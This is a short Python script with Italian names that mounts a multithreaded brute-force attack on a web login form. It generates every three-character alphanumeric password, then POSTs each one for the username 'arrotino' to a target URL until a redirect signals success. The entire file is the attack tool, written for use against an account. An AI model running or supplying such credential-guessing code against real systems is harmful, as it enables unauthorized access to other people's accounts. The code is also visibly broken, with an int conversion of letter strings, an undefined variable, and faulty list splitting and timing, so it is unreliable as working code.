from threading import Thread
import datetime,requests

URL = ""

def leggiDaFile(nomeFile):
    f = open(nomeFile, "r")
    lista = f.readlines()
    f.close()
    return [int(str(cella[:-1])) for cella in lista]

def scriviSuFile():
    possibili = "".join(chr(k) for k in range(65,91)) + "".join(chr(k) for k in range(97,123)) + "".join(chr(k) for k in range(48,58))
    f = open("./bruteForce.txt","w")
    for a in range(len(possibili)):
        for b in range(len(possibili)):
            for c in range(len(possibili)):
                print(possibili[a] + possibili[b] + possibili[c],file=f)
    f.close()


class MyThread(Thread):
    def __init__(self,lista,num):
        Thread.__init__(self)
        self.lista = lista
        self.ferma = False
    def run(self):
        while not self.ferma:
            for cella in self.lista:
                response = requests.post(URL, data={"username": "arrotino", "password": cella})
                if response.url != URL: print(f"la password è: {cella}"); self.ferma = True; break
    def stop(self):
        self.ferma = True
        print("mi fermo")

def main():
    nThread = 6
    inizio = datetime.datetime.now().microsecond
    listaDiListe,listaDivisa= [], leggiDaFile("./bruteForce.txt")
    num = len(listaDivisa) // nThread   
    for k in range(1,nThread):
        if k == 1: listaDiListe.append(listaDivisa[0:num])
        if k != 1 and k != nThread:
            listaDiListe.append(listaDivisa[num:num + num])
            num = num + num
        else: listaDiListe.append(listaDivisa[num:])
    listaThread = [MyThread(cella,numero) for cella in listaDiListe]
    for cella in listaThread:
        cella.start()
    n = True
    while n:
        for cella in listaThread:
            if cella.ferma:
                for t in listaThread:
                    t.stop()
                    t.join()
                break
        fine = datetime.datetime.now().microsecond
        break
    print(f"il programma ha elaborato in {(inizio - fine)/1000} millisecondi")
